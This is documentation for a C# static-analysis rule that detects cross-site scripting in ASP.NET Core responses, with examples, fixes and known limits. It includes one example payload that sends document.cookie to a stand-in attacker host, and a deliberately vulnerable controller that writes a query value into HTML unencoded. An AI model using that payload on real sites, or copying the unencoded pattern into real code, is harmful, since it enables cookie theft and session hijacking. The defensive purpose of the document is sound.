# HTML response built from HTTP request data (C#)

`qualor:csharp/xss` · Issue · Severity: High · [CWE-79](https://cwe.mitre.org/data/definitions/79.html) · OWASP Top 10: [A05:2025 Injection](https://top10.owasp.org/2025/A05_2025-Injection/), [A03:2021 Injection](https://top10.owasp.org/2021/A03_2021-Injection/)

## What it finds

<!-- begin: what-it-finds -->
HTTP request data in ASP.NET Core (MVC and Web API controllers, Minimal APIs, Razor Pages) written
into an HTML response without encoding:

- `Content(text, contentType)` of a controller or page, `Results.Content`, `Results.Text`,
  `TypedResults.Content` and `TypedResults.Text`, when the content type is HTML (`text/html`,
  `application/xhtml+xml` or `MediaTypeNames.Text.Html`);
- a `ContentResult` whose `ContentType` is HTML;
- raw HTML content: `new HtmlString(...)`, and `AppendHtml`, `AppendHtmlLine` and
  `SetHtmlContent` of an HTML content builder (`TagBuilder.InnerHtml`, a tag helper's output,
  `HtmlContentBuilder`);
- `Response.WriteAsync(...)` after `Response.ContentType` is set to HTML in the same method.

An error message that echoes a rejected value is reported too, also inside an allow-list check. Values
encoded for HTML (`HtmlEncoder`, `WebUtility.HtmlEncode`) or for a URL (`UrlEncoder`,
`Uri.EscapeDataString`, `WebUtility.UrlEncode`) are not reported.
Request data means the parameters of controller actions, Razor Pages handlers and Minimal API
handlers (strings, string arrays, `StringValues`, forms, uploaded files, the body stream, and any
parameter bound with `[FromQuery]`, `[FromRoute]`, `[FromForm]`, `[FromHeader]`, `[FromBody]` or
`[AsParameters]`), `[BindProperty]` properties, and the request object itself (`Request.Query`,
`Form`, `Headers`, `Cookies`, `RouteValues`, `Body`, ...). Numbers, booleans, GUIDs, dates and enums
declared earlier in the file are not reported.
<!-- end: what-it-finds -->

## Why it matters

<!-- begin: why-it-matters -->
Text pasted into HTML is read by the browser as markup. A value such as
`<script>fetch('https://evil.example/?c='+document.cookie)</script>` runs in the victim's browser
with the site's origin: it can read what the page shows, act as the user, or steal tokens that
are not protected by `HttpOnly`.
<!-- end: why-it-matters -->

## Example

<!-- begin: example -->
**Noncompliant:** the search term is pasted into an HTML fragment.

```csharp
using Microsoft.AspNetCore.Mvc;

[ApiController]
[Route("api/[controller]")]
public class SearchController : ControllerBase
{
    [HttpGet]
    public IActionResult Get([FromQuery] string q)
    {
        return Content("<p>Results for " + q + "</p>", "text/html");
    }
}
```

**Compliant:** the term is HTML-encoded before it is written.

```csharp
using System.Text.Encodings.Web;
using Microsoft.AspNetCore.Mvc;

[ApiController]
[Route("api/[controller]")]
public class SearchController : ControllerBase
{
    [HttpGet]
    public IActionResult Get([FromQuery] string q)
    {
        return Content("<p>Results for " + HtmlEncoder.Default.Encode(q) + "</p>", "text/html");
    }
}
```
<!-- end: example -->

## How to fix

<!-- begin: how-to-fix -->
- Render HTML with a Razor view or page: `@value` is HTML-encoded by default. Avoid
  `@Html.Raw` with anything that came from a request.
- When HTML must be built in code, encode each value with `HtmlEncoder.Default.Encode` (or an
  injected `HtmlEncoder`) or `WebUtility.HtmlEncode`, and use `SetContent`/`Append` rather than
  `SetHtmlContent`/`AppendHtml` for text.
- Return data as JSON (`Ok`, `Json`, `Results.Json`) or as plain text (`Content(text)` and
  `Results.Text(text)` default to `text/plain`) when the client does not need HTML.
<!-- end: how-to-fix -->

## Frameworks and APIs covered

- ASP.NET Core MVC and Web API
- ASP.NET Core Minimal APIs
- ASP.NET Core Razor Pages

## Known limits

<!-- begin: known-limits -->
Under `qualor dotnet end`, Qualor's Roslyn taint engine runs this rule in OpenGrep's place, on the
projects the build compiled. It follows request data across methods, files and projects, through
properties, expression-bodied members and services registered for dependency injection, and into the
code of compiled Razor views and pages (`.cshtml`), and it reads all C# the compiler accepts. A
finding is of high confidence, or medium ("Possible" in Qualor) when its path goes through data
stored earlier in the request, a lookup by a request key, or a call or view the engine could not
narrow down. The engine's own limits are listed in the [models' README](../../../models/README.md),
section "Known limits". The bullets below are the OpenGrep rule's: it runs outside
`qualor dotnet end`, on C# files no compiled project covers, and as the fallback when the engine
cannot finish.

- OpenGrep does not analyse Razor views (`.cshtml`) or Razor components (`.razor`), so
  `@Html.Raw(...)` and `MarkupString` in markup, the main raw-HTML outputs of MVC and Razor Pages,
  are not checked by this rule. The engine checks `@Html.Raw(...)` and `HtmlString` in compiled
  `.cshtml` views and pages; Blazor's `MarkupString` is checked by neither.
- Taint is followed through the methods of one file, not into other files: request data passed to
  a view, a view component or a service is missed. Request data read inside an expression-bodied
  method (`=> ...`) or a property getter is missed.
- Minimal APIs: a class or record parameter bound from the JSON body without `[FromBody]` is not
  taken for request data, and a handler that is a method of another class is missed. A controller
  named `*Controller` whose base class has another name is missed.
- An enum parameter is reported when the enum is declared after its use or in another file. Only
  allow-lists written as `static readonly` tables of literals count; an equality check or
  `Enumerable.Contains(...)` called as a static method does not, and a variable assigned again
  after a check still counts as checked.
- The HTML content type must be written as a string starting with `text/html` or
  `application/xhtml+xml` (in place or in a constant) or as `MediaTypeNames.Text.Html`; a content
  type chosen at run time is not followed.
- `Request.Path` and `Request.PathBase` written as they are (`PathString`) are not reported: they
  are escaped for a URI, which keeps them inside text and double-quoted attributes. That escaping
  is not HTML encoding (`'`, `(`, `)`, `=` and `&` pass), so one placed in a single-quoted
  attribute or a script string is missed. Their `.Value` is reported, but not when the
  `PathString` was first stored in a variable.
- `Response.WriteAsync` is checked only after the response's content type is set to HTML in the
  same method; a response written without a content type, which a browser may still sniff as HTML,
  is not reported.
- OpenGrep 1.30 does not parse some newer C# syntax (raw strings with `$$"""`, types declared
  without a body such as `class X : Y;`, some multi-line collection expressions); code in those
  parts of a file may be missed.
<!-- end: known-limits -->

## Tests

The test file [`rules/csharp/xss/xss.cs`](../../../rules/csharp/xss/xss.cs) holds every case the rule reports or accepts:
lines marked `ruleid:` must be reported and lines marked `ok:` must not. The known limits are
marked `todoruleid:` (missed) and `todook:` (wrongly reported). `npm test` runs them with OpenGrep,
and checks the example above as well.

The rule: [`rules/csharp/xss/xss.yml`](../../../rules/csharp/xss/xss.yml), added in version 2026.10.5.
